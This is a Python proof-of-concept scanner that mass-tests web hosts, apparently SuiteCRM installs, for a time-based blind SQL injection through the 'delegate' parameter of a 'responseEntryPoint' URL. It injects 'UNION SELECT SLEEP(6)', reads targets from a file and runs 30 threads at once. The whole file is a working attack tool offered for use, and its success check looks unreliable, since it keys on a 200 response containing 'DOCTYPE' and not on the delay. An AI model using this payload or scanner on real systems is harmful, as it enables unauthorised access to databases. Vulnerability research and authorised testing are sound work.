from lxml import etree
import requests
from multiprocessing.dummy import Pool
import argparse
import textwrap

requests.packages.urllib3.disable_warnings()
import re


def check(url):
    try:
        url1 = f'{url}/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept'
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
            "Accept-Encoding": "gzip",
            "Connection": "close"
        }
        response = requests.get(url=url1, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "DOCTYPE" in response.text:
            print(f'[*]{url}:漏洞存在')
        else:
            print('无法执行')
    except Exception as e:
        print('延时')


def main():
    parser = argparse.ArgumentParser(description="这 是 一 个 poc",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
                                     epilog=textwrap.dedent('''python suite.py -u http://127.0.0.1:8000/'''))
    parser.add_argument('-u', '--url', help="python suite.py -u http://127.0.0.1:8000/", dest='url')
    parser.add_argument('-r', '--rl', help="python suite.py -r 1.txt", dest='rl')
    args = parser.parse_args()
    u = args.url
    r = args.rl
    pool = Pool(processes=30)
    lists = []
    try:
        if u:
            check(u)
        elif r:
            with open(r, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    if 'http' in target:
                        lists.append(target)
                    else:
                        targets = f"http://{target}"
                        lists.append(targets)
    except Exception as e:
        print(e)
    pool.map(check, lists)


if __name__ == '__main__':
    main()
    banner = '''
        .__           .__  .__                                      
    |  |__   ____ |  | |  |   ____    __ __  ______ ___________ 
    |  |  \_/ __ \|  | |  |  /  _ \  |  |  \/  ___// __ \_  __ \
    |   Y  \  ___/|  |_|  |_(  <_> ) |  |  /\___ \\  ___/|  | \/
    |___|  /\___  >____/____/\____/  |____//____  >\___  >__|   
         \/     \/                              \/     \/       
                '''
    print(banner)
